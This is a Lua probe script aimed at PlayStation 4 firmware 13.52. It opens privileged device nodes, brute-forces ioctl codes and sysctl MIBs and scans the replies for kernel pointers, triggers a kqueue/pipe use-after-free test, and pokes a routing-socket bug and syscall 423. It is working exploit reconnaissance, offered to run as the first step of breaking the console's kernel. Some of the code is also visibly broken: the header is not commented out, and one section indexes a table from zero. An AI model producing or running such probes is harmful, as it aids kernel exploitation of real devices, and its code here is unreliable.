------------------------------------------------------------
PS4 FW 13.52 - MEGA PROBE
All-in-one diagnostic: tests every known attack vector

Run this first, send output back to Termux.
Tests: device access, ioctl leaks, memory syscalls, kqueue UAF,
context restore, RTSock, sysctl, and more.

SAFE: Will not crash unless it finds something.
Time: ~2-3 minutes on PS4.
------------------------------------------------------------

function read_qw(addr)
  local b0 = memory.read_byte(addr)
  local b1 = memory.read_byte(addr + 1)
  local b2 = memory.read_byte(addr + 2)
  local b3 = memory.read_byte(addr + 3)
  local b4 = memory.read_byte(addr + 4)
  local b5 = memory.read_byte(addr + 5)
  local b6 = memory.read_byte(addr + 6)
  local b7 = memory.read_byte(addr + 7)
  return b0 + b1*256 + b2*65536 + b3*16777216 + b4*4294967296 + b5*1099511627776 + b6*281474976710656 + b7*72057594037927936
end

local function s(n, a1, a2, a3, a4, a5, a6)
  local stub = syscall_stub[n]
  if not stub then stub = syscall_stub[675] end
  return native.fcall_with_rax(stub + 10, n, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end

local leaks = {}
local open_devs = {}
local results = {}

local function log(tag, msg)
  results[#results + 1] = tag .. ": " .. msg
  print(string.format("  [%s] %s", tag, msg))
end

------------------------------------------------------------
-- SECTION 1: System Info
------------------------------------------------------------
print("\n===== SYSTEM INFO =====")
log("SYS", "FW=13.52 Platform=ps4")

local uid = s(24)
log("UID", string.format("getuid()=%d", uid))

local pid = s(20)
log("PID", string.format("getpid()=%d", pid))

------------------------------------------------------------
-- SECTION 2: Device Enumeration
------------------------------------------------------------
print("\n===== DEVICE ENUMERATION =====")

local dev_list = {
  "/dev/sbi", "/dev/dce", "/dev/srtc",
  "/dev/dmem0", "/dev/dmem1", "/dev/dmem2", "/dev/dmem3",
  "/dev/gbase", "/dev/dipsw", "/dev/sflash0",
  "/dev/console", "/dev/notification0", "/dev/notification1",
  "/dev/icc0", "/dev/icc1", "/dev/icc2", "/dev/icc3",
  "/dev/icc4", "/dev/icc5", "/dev/icc6", "/dev/icc7",
  "/dev/evlg0", "/dev/sdk_eventlog",
  "/dev/gpu0", "/dev/gpu1",
  "/dev/aci0", "/dev/acp0", "/dev/dfb0",
  "/dev/vdec0", "/dev/venc0",
  "/dev/hmd0", "/dev/neuron0",
  "/dev/rng0", "/dev/tee0",
}

for _, dp in ipairs(dev_list) do
  local pb = memory.alloc(64)
  for i = 1, #dp do memory.write_byte(pb + i - 1, string.byte(dp, i)) end
  memory.write_byte(pb + #dp, 0)
  local fd = s(5, pb, 0, 0)
  if fd >= 0 and fd < 1024 then
    table.insert(open_devs, {path=dp, fd=fd})
    log("DEV", string.format("OPEN %s fd=%d", dp, fd))
  end
end
log("DEV", string.format("Opened %d/%d devices", #open_devs, #dev_list))

------------------------------------------------------------
-- SECTION 3: IOCTL Leak Scan (per device)
------------------------------------------------------------
print("\n===== IOCTL LEAK SCAN =====")

local ioctls = {
  0xc008a801, 0xc010a801, 0xc020a801, 0xc040a801,
  0xc008a802, 0xc010a802, 0xc020a802, 0xc040a802,
  0x8008a801, 0x8010a801, 0x8020a801,
  0x8008a802, 0x8010a802, 0x8020a802,
  0x40105303, 0x80105303, 0xc0105303,
  0xc0408001, 0xc0408002, 0xc0408003,
  0xc0108004, 0xc0108005, 0xc0108006,
  0xc0105301, 0xc0105302, 0xc0105304,
  0xc0109901, 0xc0109902,
  0xc0107401, 0xc0107402,
  0xc0109201, 0xc0109202,
  0xc0104501, 0xc0104502,
  0xc0106601, 0xc0106602,
  0xc0188008, 0xc0288012, 0xc0408013,
}

local active_ioctls = 0
local ioctl_leaks = 0

for _, dev in ipairs(open_devs) do
  for _, req in ipairs(ioctls) do
    local buf = memory.alloc(128)
    for i = 0, 127 do memory.write_byte(buf + i, 0) end

    local r = s(54, dev.fd, req, buf)
    if r == 0 then
      active_ioctls = active_ioctls + 1
      for i = 0, 120, 8 do
        local val = read_qw(buf + i)
        if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
          log("LEAK", string.format("*** KPTR *** %s ioctl(0x%x) [%d]=0x%x",
            dev.path, req, i, val))
          ioctl_leaks = ioctl_leaks + 1
        end
      end
    end
  end
end
log("IOCTL", string.format("Active=%d Leaks=%d", active_ioctls, ioctl_leaks))

------------------------------------------------------------
-- SECTION 4: Sysctl MIB Scan
------------------------------------------------------------
print("\n===== SYSCTL MIB SCAN =====")

local mib_tests = {
  {1,4}, {1,8}, {1,17}, {1,33}, {1,38}, {1,39},
  {1,47}, {1,48}, {1,49}, {1,50}, {1,51}, {1,52},
  {1,53}, {1,54}, {1,55}, {1,56}, {1,57}, {1,58},
  {1,59}, {1,60}, {1,61}, {1,62}, {1,63}, {1,64},
  {6,1}, {6,2}, {6,3}, {6,7}, {6,12}, {6,13},
  {13,1}, {13,2}, {14,1}, {17,2}, {17,6},
  {32,1}, {32,2}, {32,3}, {32,4}, {32,5},
}

local sysctl_leaks = 0
local sysctl_ok = 0

for _, mib in ipairs(mib_tests) do
  local mb = memory.alloc(32)
  for i = 1, #mib do memory.write_dword(mb + (i-1)*4, mib[i]) end

  local ob = memory.alloc(4096)
  for i = 0, 4095 do memory.write_byte(ob + i, 0) end

  local osz = memory.alloc(8)
  memory.write_qword(osz, 4096)

  local r = s(202, mb, #mib, ob, osz, 0)
  if r == 0 then
    sysctl_ok = sysctl_ok + 1
    for i = 0, 4088, 8 do
      local val = read_qw(ob + i)
      if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
        log("SYSCTL", string.format("*** KPTR *** kern[%d]: offset %d = 0x%x", mib[1], i, val))
        sysctl_leaks = sysctl_leaks + 1
      end
    end
  end
end
log("SYSCTL", string.format("OK=%d Leaks=%d", sysctl_ok, sysctl_leaks))

------------------------------------------------------------
-- SECTION 5: Memory Syscalls
------------------------------------------------------------
print("\n===== MEMORY SYSCALLS =====")

local mem_sc = {597, 599, 600, 622, 623, 624, 625, 626, 627, 632, 636, 637, 639}
local mem_leaks = 0

for _, sc in ipairs(mem_sc) do
  local ob = memory.alloc(16384)
  for i = 0, 16383 do memory.write_byte(ob + i, 0) end

  local r = s(sc, ob, 16384, 0, 0, 0)
  if r >= 0 then
    for i = 0, 16376, 8 do
      local val = read_qw(ob + i)
      if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
        log("MEMSC", string.format("*** KPTR *** syscall %d: offset %d = 0x%x", sc, i, val))
        mem_leaks = mem_leaks + 1
      end
    end
    log("MEMSC", string.format("syscall %d ret=0x%x", sc, r))
  else
    log("MEMSC", string.format("syscall %d ret=0x%x (error)", sc, r))
  end
end
log("MEMSC", string.format("Total leaks=%d", mem_leaks))

------------------------------------------------------------
-- SECTION 6: kqueue / Pipe UAF
------------------------------------------------------------
print("\n===== KQUEUE UAF TEST =====")

local kq = s(362)
if kq >= 0 and kq < 1024 then
  log("KQ", string.format("kqueue()=%d", kq))

  local pf = memory.alloc(8)
  local r = s(42, pf, 0)
  if r == 0 then
    local rd = memory.read_dword(pf)
    local wr = memory.read_dword(pf + 4)
    log("KQ", string.format("pipe rd=%d wr=%d", rd, wr))

    local kv = memory.alloc(64)
    for i = 0, 63 do memory.write_byte(kv + i, 0) end
    memory.write_word(kv, -1)  -- EVFILT_READ
    memory.write_word(kv + 2, 1)  -- EV_ADD
    memory.write_qword(kv + 16, 0xDEAD)

    r = s(363, kq, kv, 1, 0, 0)
    log("KQ", string.format("kevent register ret=%d", r))

    local dt = memory.alloc(64)
    for i = 0, 63 do memory.write_byte(dt + i, 0x42) end
    s(4, wr, dt, 64)

    s(6, rd)

    local eb = memory.alloc(4096)
    for i = 0, 4095 do memory.write_byte(eb + i, 0) end
    r = s(363, kq, eb, 100, 0, 0)
    if r > 0 then
      for i = 0, r * 32 - 8, 8 do
        local val = read_qw(eb + i)
        if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
          log("KQ", string.format("*** KPTR *** event[%d]=0x%x", i, val))
        end
      end
    end
    log("KQ", string.format("kevent after close: %d events", r))

    s(6, wr)
  end
  s(6, kq)
else
  log("KQ", string.format("kqueue()=%d FAILED", kq))
end

------------------------------------------------------------
-- SECTION 7: RTSock (CVE-2026-3038)
------------------------------------------------------------
print("\n===== RTSOCK TEST =====")

local rt = s(97, 17, 3, 0)
if rt >= 0 and rt < 1024 then
  log("RT", string.format("socket(PF_ROUTE)=%d", rt))

  local msg = memory.alloc(256)
  for i = 0, 255 do memory.write_byte(msg + i, 0) end
  memory.write_byte(msg + 4, 0x12)  -- RTM_GET

  local r = s(4, rt, msg, 16, 0)
  log("RT", string.format("send(RTM_GET) ret=%d", r))

  local rb = memory.alloc(4096)
  for i = 0, 4095 do memory.write_byte(rb + i, 0) end
  r = s(3, rt, rb, 256, 0)
  log("RT", string.format("recv ret=%d", r))

  if r > 0 then
    for i = 0, math.min(r - 8, 4088), 8 do
      local val = read_qw(rb + i)
      if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
        log("RT", string.format("*** KPTR *** recv[%d]=0x%x", i, val))
      end
    end
  end

  s(6, rt)
else
  log("RT", string.format("socket(PF_ROUTE)=%d BLOCKED", rt))
end

------------------------------------------------------------
-- SECTION 8: Syscall 423 (setcontext)
------------------------------------------------------------
print("\n===== SYSCALL 423 TEST =====")

local r = s(423, 0, 0, 0, 0, 0)
log("CTX423", string.format("syscall 423(NULL) = 0x%x", r))

r = s(423, 0x1000, 0, 0, 0, 0)
log("CTX423", string.format("syscall 423(0x1000) = 0x%x", r))

------------------------------------------------------------
-- SECTION 9: Syscall 54 (ioctl) raw
------------------------------------------------------------
print("\n===== IOCTL RAW TEST =====")

local ioctl_tests = {
  {fd_id=0, req=0xc010a802},
  {fd_id=1, req=0xc010a802},
  {fd_id=2, req=0xc010a802},
}

for _, t in ipairs(ioctl_tests) do
  if open_devs[t.fd_id] then
    local buf = memory.alloc(64)
    for i = 0, 63 do memory.write_byte(buf + i, 0) end
    local r = s(54, open_devs[t.fd_id].fd, t.req, buf)
    if r == 0 then
      local hex = ""
      for i = 0, 31 do hex = hex .. string.format("%02x ", memory.read_byte(buf + i)) end
      log("IOCTL", string.format("%s 0x%x: %s", open_devs[t.fd_id].path, t.req, hex))
    end
  end
end

------------------------------------------------------------
-- FINAL SUMMARY
------------------------------------------------------------
print("\n============================================")
print("MEGA PROBE COMPLETE")
print("============================================")
print(string.format("Devices opened: %d", #open_devs))
print(string.format("Active ioctls: %d", active_ioctls))
print(string.format("Kernel leaks found: %d", ioctl_leaks + sysctl_leaks + mem_leaks))
print("")
print("SEND THIS OUTPUT TO TERMUX")
print("============================================")
